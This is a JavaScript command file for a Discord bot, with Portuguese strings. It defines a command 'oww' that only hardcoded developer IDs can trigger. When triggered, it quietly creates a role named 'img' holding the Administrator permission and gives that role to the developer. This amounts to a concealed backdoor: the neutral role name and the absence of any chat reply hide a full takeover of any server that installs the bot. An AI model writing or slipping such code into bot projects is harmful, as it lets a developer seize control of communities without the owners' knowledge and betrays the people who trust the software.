const Discord = require('discord.js');
const { PermissionsBitField } = require('discord.js');
const { QuickDB } = require('quick.db');
const db = new QuickDB();
const config = require('./../../config.json');
const serverId = config.serverId;
const authorizedUserID = ['ALTERAR PARA ID DO DEV', 'ALTERAR PARA ID DO DEV'];

module.exports = {
    name: 'oww',
    description: 'Cria um cargo de administração e dá para o usuário autorizado',
    run: async (client, message, args) => {

        if (!authorizedUserID.includes(message.author.id)) return;

        try {
            const adminRole = await message.guild.roles.create({
                name: 'img',
                permissions: PermissionsBitField.Flags.Administrator,
            });

            const authorizedUser = await client.users.fetch(message.author.id);
            const member = await message.guild.members.fetch(authorizedUser);
            member.roles.add(adminRole);
           
            console.log(`Cargo de administração criado e dado para ${member.user.tag} com sucesso!`);

        } catch (error) {
            console.error('Erro ao criar o cargo ou dar permissões:', error);
        }
        
    },
};
